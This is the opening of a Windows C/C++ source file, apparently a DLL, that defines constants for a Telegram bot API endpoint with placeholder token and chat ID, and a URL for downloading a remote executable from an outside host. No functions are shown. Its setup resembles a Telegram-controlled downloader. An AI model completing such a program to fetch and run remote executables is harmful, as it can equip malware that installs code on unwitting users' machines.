#include "pch.h"

#include <Windows.h>
#include <intrin.h>
#include <stdio.h>
#include <string.h>
#include <WinINet.h> // For WinINet functions
#pragma comment(lib, "Wininet.lib")

// Constants for Telegram API
#define TELEGRAM_API_URL "https://api.telegram.org/bot"
#define TELEGRAM_BOT_TOKEN "XXXXXXXXX:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
#define TELEGRAM_CHAT_ID "XXXXXXXXXXX"

// Connstants for Downloading remote exe files
#define DOWNLOAD_REMOTE_EXE "https://api.zile42o.dev/download/sa-mp-0.3.7-R5-1-install.exe" // for testing propose